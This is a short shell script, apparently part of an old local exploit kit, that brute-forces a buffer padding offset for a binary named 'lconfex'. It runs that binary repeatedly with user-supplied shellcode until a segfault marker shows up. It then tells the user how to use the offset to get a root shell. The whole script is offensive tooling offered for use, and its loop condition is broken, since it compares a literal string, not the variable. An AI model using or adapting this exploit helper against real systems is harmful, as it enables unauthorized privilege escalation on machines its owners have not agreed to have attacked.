#!/bin/sh
padstart=800

if [ -z $1 -o -z $2 ]; then
	echo "sh $0 <&shellcode> <&padstring>"
	exit
fi
if [ ! -f lconfex ]; then
	echo "lconfex not found!!"
	exit
fi

echo "Please wait for a while =).."

if [ -d segfault.eng ]; then
	rm -rf segfault.eng
fi

until [ padstart = 600 ]
do
	`./lconfex -s $1 -m $2 -r $padstart 2>tmp.junk`
	if [ `grep "segfault.eng/segfault.eng" tmp.junk | wc -l` != 0 ]; then
		echo
		echo "GOT IT! Your magic number is : $padstart"
		echo "Now create a dir 'segfault.eng' and touch a file named 'segfault.eng' in it."
		echo "Then exec \"./lconfex -s $1 -m $2 -r $padstart\" to get rootshell"
		echo 
		echo "*hint* : try play with -b <n> if not succeed. [ n = 0..4 ]"
		echo "    ie : ./lconfex -s $1 -m $2 -r $padstart -b 1"
		echo
		echo "Good Luck d0inks!"
		echo 
		rm -f tmp.junk
		exit
	fi

	padstart=`expr $padstart - 1`
done

echo "Sorry, can't find padstart no."
echo "Try to play with -a <1..4> option"
rm -f tmp.junk
